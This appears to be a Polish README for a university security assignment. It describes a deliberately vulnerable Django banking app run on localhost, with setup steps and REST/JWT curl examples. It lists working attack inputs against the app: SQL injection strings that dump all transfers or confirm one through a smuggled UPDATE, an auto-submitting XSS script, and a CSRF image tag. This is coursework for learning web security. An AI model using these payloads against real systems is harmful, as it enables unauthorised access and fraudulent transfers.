# Bezpieczenstwo-komputerowe
## Lista 7

Projekt banku pozwalający wysyłać przelewy.

### Użycie

Przykład instalacji oraz wywołania
```Shell
$ virtualenv venv
$ source venv/bin/activate
(venv) $ pip3 install -r requirements.txt
(venv) $ python3 bank/manage.py runserver
```

Wpisujemy w przeglądarce 'localhost:8000' <br>

Trzeba również stworzyć użytkownika i bazę danych w mysql według danych w bank/bank/settings.py:106-114.

### SQL Injection
Wyświetlenie wszystkich przelewów z bazy danych
```Shell
" OR "" = ""; #
```

Zatwierdzenie przelewu
```Shell
"; UPDATE transfer_transfer SET isConfirmed = 1 WHERE title = "Pewien tytul"; #
```

Wyświetlenie plików w systemie (w polu sql query)
```Shell
SHOW VARIABLES WHERE Variable_Name LIKE "%dir";
```

### Cross-site scripting (XSS)
```Shell
<script>window.addEventListener('load', function(){document.getElementsByTagName("form")[0].submit()})</script>
```

### Cross-site request forgery (XSRF)
```Shell
<img src="http://localhost:8000/transfer/admin/confirm/">
```

### rest API
```Shell
$ curl -X POST --header Content-Type:application/json --data '{"username":"<username>", "email":"<mail>", "password":"<password">}' http://localhost:8000/account/api/registation/
$ curl -X POST --header Content-Type:application/json --data '{"recipientName":"Pan x", "recipientAccount":"12345678901234567890123456", "title":"Tytul", "amount":"12345"}' -u username http://localhost:8000/transfer/api/prepare/
```

### token JWT
```Shell
$ curl -X POST --header Content-Type:application/json --data '{"username":"<username>","password":"<password">}' http://localhost:8000/api/token/
$ curl -X POST --header Content-type:application/json --data '{"refresh":"<token>"}'  http:/localhost:8000/api/token/refresh/
$
$ curl -X GET --header Content-Type:application/json -H "Authorization: Bearer <token>" http://localhost:8000/transfer/api/list/
$ curl -X POST --header Content-Type:application/json -H "Authorization: Bearer <token>" --data '{"recipientName":"Pan x", "recipientAccount":"12345678901234567890123456", "title":"Tytul", "amount":"123"}' http://localhost:8000/transfer/api/prepare/
```
